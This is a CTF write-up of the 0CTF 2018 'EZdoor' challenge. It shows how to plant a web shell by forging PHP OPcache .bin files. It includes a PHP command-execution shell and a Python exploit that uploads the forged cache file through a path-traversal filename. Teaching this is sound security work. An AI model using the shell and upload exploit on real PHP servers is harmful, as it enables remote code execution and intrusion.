---
layout: post
title:  "0CTF 2018 EZdoor Web Challenge"
subtitle: 'Sunshine CTF 2018 web challenges writeup'
date:   2018-04-10 00:06:31
tags:
- Web Security, 0CTF 2018, PHP OPcache 
---

Challenge name: `EZdoor`

Link: `http://202.120.7.217:9527`

In this challenge, we are greeted with the <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/tree/master/scripts/0CTF/source.php">source code</a>:

Breaking down the code,

{% highlight php %}

if(!file_exists($dir . "index.php")){
  touch($dir . "index.php");
}

{% endhighlight %}

does create a new `index.php` file if not created already.

This question was kind of similar to the one we had for ASIS CTF finals couple of years back. This made me realise that it was related to OPCache and since there was a <a href="http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/">writeup</a>, probably a research, on the same.

So going line by line, we were provided with 5 different functionalities - `pwd` for the `path`, `phpinfo` which provides the info page, `reset` to clear the directory, `time` to show the timestamp (this will prove to be important later) & `upload` option to upload our file.

Understanding the problem deeper, `OPCache` is the built-in caching engine with PHP 7.0.* versions. It not only compiles PHP scripts and sets the resulting bytecode in memory but also, offers caching in the filesystem when specifying a destination folder in `PHP.ini` file.

You can find the line `opcache.file_cache=/tmp/opcache` in `PHP.ini` file. Inside this folder, `OPCache` stores its compiled PHP scripts in the same folder where the PHP code is written. So essentially, a compiled version of `/var/www/index.php` will be stored in `/tmp/opcache/<system_id>/var/www/index.php.bin`.

To generate a `phpbin` file, create a `index.php` file with contents:


```
<?php
   system($_GET['cmd']);
?>
```


and then, `php -S 127.0.0.1:8080` and a simple `wget 127.0.0.1:8080` generated the `phpbin` file.

Also for this, the `php.ini` files has to be updated in the following way:


```
opcache.enable=1
opcache.validate_timestamps=1
opcache.file_cache= "/var/www/html/cache"
opcache.file_cache_only=1
```

Now to calculate the `system_id`, we have got a tool over <a href="https://github.com/GoSecure/php7-opcache-override">here</a> and with that, we can identify what we want to calculate.

To calculate the above, the parameters were `php_version = 7.0.28` , `zend_extension_id: API320151012,NTS` and `zend_bin_id: BIN_SIZEOF_CHAR48888`.

Calculation of `system_id` : `digest = hashlib.md5(php_version + zend_extension_id + zend_bin_id).hexdigest()`

Now about solving the challenge, firstly, to control the cache file, we mainly need to get hold of two parameters, `timestamp` and `opchache_ID`.


After generating the system ID, grab the `timestamp`. Set this to the OPcached web-shell (index.php.bin) to bypass opchache.validation_timestamp and upload it.

The final script was:

```
import struct
import requests

URL = "http://202.120.7.217:9527/"
sid = "7badddeddbd076fe8352e80d8ddf3e73"
UID = "c607e0c365ae4a0ea516aadaad3db7adfe45df9c" #constant
SID = "7badddeddbd076fe8352e80d8ddf3e73" #SystemID calculated

requests.get(URL+"?action=reset")
print "Reset done"


timestamp = int(requests.get(URL+"?action=time").text)
print "Time stamp: " + str(ts)


f = open("index.php.bin").read()

path = f[:8]+sid+f[40:64]+struct.pack("I", timestamp)+f[68:] #this is done to replace the SystemID and timestamp with a custom one in an already existing one

requests.post(
    URL+"?action=upload&name=../../../../../tmp/cache/"+SID+"/var/www/html/sandbox/"+UID+"/index.php.bin"
    , files=dict(file=path)
    )
```


Reach me out on <a href="https://twitter.com/gkgkrishna33/status/991205002562519041">Twitter</a> for more queries.
